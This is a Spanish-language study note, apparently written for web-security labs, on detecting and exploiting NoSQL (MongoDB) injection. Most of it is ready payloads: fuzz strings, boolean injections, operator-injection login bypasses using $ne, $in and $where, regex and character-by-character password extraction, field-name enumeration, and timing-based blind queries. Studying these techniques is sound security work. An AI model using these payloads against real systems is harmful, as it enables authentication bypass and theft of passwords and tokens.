---
aliases:
  - NoSQL injection
  - nosql-entrypoint
  - MongoDB injection
tags:
  - vuln/nosql-injection
  - entrypoint
---

# NoSQL injection — Punto de entrada

> Documento **agnóstico**: *cómo **detectar y explotar** NoSQL injection* (MongoDB). Los labs con objetivo y solución → [[vulnerabilities/023-nosql-injection/labs/README|labs de NoSQL]].

## 🧬 Los dos tipos (la clave de todo)

- **Syntax injection** — el input va **dentro de un string** de la query. Rompés la sintaxis con `'` e inyectás **JavaScript** (como SQLi). Sirve para boolean/blind y extracción.
- **Operator injection** — el input es un **valor** que convertís en un **objeto operador** de Mongo. Típico en **bodies JSON**:
  ```
  {"username":"wiener"}   →   {"username":{"$ne":"invalid"}}
  username=wiener         →   username[$ne]=invalid          (form / query-string)
  ```

## 🔍 Detección — fuzz string

Mandá una cadena que mezcle metacaracteres para **provocar un error** o un **cambio de comportamiento**:

```
'"`{
;$Foo}
$Foo \xYZ
```

**URL-encoded** (para meterla en un parámetro):
```
https://insecure-website.com/product/lookup?category='%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00
```

**Escapada** (un solo renglón):
```
'\"`{\r;$Foo}\n$Foo \\xYZ\u0000
```

## ✅ Verificar el cambio de comportamiento (boolean)

Confirmá que controlás la lógica con condiciones verdadera/falsa:

```
' && 0 && 'x        → FALSO  (no devuelve nada)
' && 1 && 'x        → VERDADERO (devuelve normal)
'||'1'=='1          → siempre VERDADERO (devuelve de más / todo)
```

**Omitir el resto de la consulta** (null byte):
```
'%00
```

## 💥 Operator injection (bypass de auth)

En logins que aceptan JSON, cambiá los valores por operadores:

```json
{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}
```
```json
{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}
```

Inyectar un operador propio en un body existente (`$where`):
```json
{"username":"wiener","password":"peter", "$where":"0"}
```

Comprobar patrón con `$regex` (¿empieza con `a`?):
```json
{"username":"admin","password":{"$regex":"^a.*"}}
```

## 📤 Extraer información

**Syntax injection — carácter a carácter** (boolean/blind):
```
admin' && this.password[0] == 'a' || 'a'=='b
admin' && this.password.match(/\d/) || 'a'=='b       # ¿tiene un dígito?
admin' && this.username!='                           # confirmar el registro
```

**Nombres de campos desconocidos** (`$where` + `Object.keys`):
```json
"$where":"Object.keys(this)[0].match('^.{0}a.*')"
```
> Iterás índice (`[0]`, `[1]`, …) y posición/char del `match` para reconstruir cada **key** del objeto (ej. descubrir el campo del reset token).

## ⏱️ Timing-based (blind sin oráculo visible)

Cuando no hay diferencia observable en la respuesta, medí el **tiempo**:

```
admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") && waitTill > new Date()){};}(this)+'
```
```
admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'
```
> Si la condición es verdadera, la respuesta **tarda ~5s** → inferís el dato bit a bit.

> [!note] Ver también
> - **Labs** (4, con objetivo y solución) → [[vulnerabilities/023-nosql-injection/labs/README|labs de NoSQL]].
> - **Scripts:** `guess-password.py` (extraer password) · `operation-injection-extract-unkown-fields.py` (`$where` + campos) → `vulnerabilities/023-nosql-injection/`.
> - **SQL injection** (misma lógica boolean/blind/timing, otra DB) → [[vulnerabilities/001-sql-injection/README|sql injection]].
